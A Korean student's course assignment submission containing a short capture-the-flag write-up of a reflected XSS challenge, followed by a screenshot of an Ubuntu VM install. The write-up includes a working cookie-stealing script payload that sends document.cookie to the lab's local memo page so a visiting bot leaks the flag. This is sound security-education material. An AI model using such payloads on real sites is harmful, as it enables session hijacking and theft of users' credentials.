#5주차 과제 제출 창입니다.

풀이한 워게임 라이트업과 vm 우분투 설치 화면을 캡쳐하여 올려주세요.

## [XSS-1]-XSS 취약점

## 문제 분석
1. 해당 페이지에서는 총 3가지의 기능 존재 
-vuln=> 입력값 그대로 반환
-flag=> 페이로드 제출-> 봇이 방문
-memo=> 텍스트를 누적 저장 후 출력

## 취약점 분석
<img width="666" height="196" alt="Image" src="https://github.com/user-attachments/assets/455e73c9-3b7c-4fd7-9100-11a4b5f0f89e" />
-param 값이 아무 필터링 없이 그대로 반환

## 쿠키 탈취 방법(공격 시나리오)
1. flag 페이지에 페이로드 제출 -> 
<script>document.location='http://127.0.0.1:8000/memo?memo='+document.cookie</script>
2. 봇이 페이로드를 참고하여 방문
3. 봇이 쿠키를 memo 페이지로 전송
4. 메모 페이지에 FLAG 나타남 

## 실행 결과
<img width="938" height="410" alt="Image" src="https://github.com/user-attachments/assets/f3f5b7f2-6a88-41b0-a316-375d14c5d4bf" />





## vm 우분투 설치
<img width="1400" height="1626" alt="Image" src="https://github.com/user-attachments/assets/b59511e0-2e55-4aa5-bd56-2fbd6476f28d" />